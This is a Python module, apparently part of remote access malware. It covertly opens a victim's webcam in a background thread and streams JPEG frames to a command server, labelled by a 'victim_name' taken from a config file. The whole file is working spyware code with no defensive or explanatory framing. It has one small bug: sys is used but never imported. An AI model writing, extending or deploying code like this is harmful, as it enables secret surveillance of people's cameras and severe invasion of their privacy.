import threading
import time
import cv2
import requests
import base64

import config

_camera_thread = None
_camera_running = False

def _instantiate_capture(index: int):
    if sys.platform == "win32":
        try:
            return cv2.VideoCapture(index, cv2.CAP_DSHOW)
        except Exception:
            pass
    return cv2.VideoCapture(index)


def _find_working_camera_index(max_index: int = 10):
    for index in range(max_index):
        cap = _instantiate_capture(index)
        if cap.isOpened():
            cap.release()
            return index
        cap.release()
    return None


def start_camera_stream(server_url: str = None, victim_name: str = None, fps: int = 20):
    global _camera_thread, _camera_running
    if _camera_thread is not None and _camera_thread.is_alive():
        return {"status": "error", "message": "Camera already streaming"}

    if server_url is None:
        server_url = config.SERVER_URL
    if victim_name is None:
        victim_name = config.PC_NAME

    camera_index = _find_working_camera_index(max_index=5)
    if camera_index is None:
        return {"status": "error", "message": "Unable to open any webcam device"}

    print(f"[+] [camera] Using camera index {camera_index}", flush=True)
    _camera_running = True

    def _camera_loop():
        cap = _instantiate_capture(camera_index)
        if not cap.isOpened():
            print(f"[-] Unable to open webcam at index {camera_index}", flush=True)
            return

        interval = 1.0 / max(1, fps)

        while _camera_running:
            ret, frame = cap.read()
            if not ret:
                time.sleep(interval)
                continue

            # Resize to max 640 width to reduce network load
            h, w = frame.shape[:2]
            if w > 640:
                scale = 640 / float(w)
                frame = cv2.resize(frame, (640, int(h * scale)))

            ret2, jpeg = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            if not ret2:
                continue

            try:
                requests.post(
                    f"{server_url}/camera/upload/{victim_name}",
                    data=jpeg.tobytes(),
                    headers={"Content-Type": "image/jpeg"},
                    timeout=2,
                )
            except Exception as e:
                print(f"[-] Camera upload error: {e}", flush=True)

            time.sleep(interval)

        cap.release()
        print("[+] Camera stream stopped", flush=True)

    _camera_thread = threading.Thread(target=_camera_loop, daemon=True)
    _camera_thread.start()

    return {"status": "success", "message": "Camera streaming started"}


def stop_camera_stream():
    global _camera_running
    _camera_running = False
    return {"status": "success", "message": "Camera streaming stop requested"}
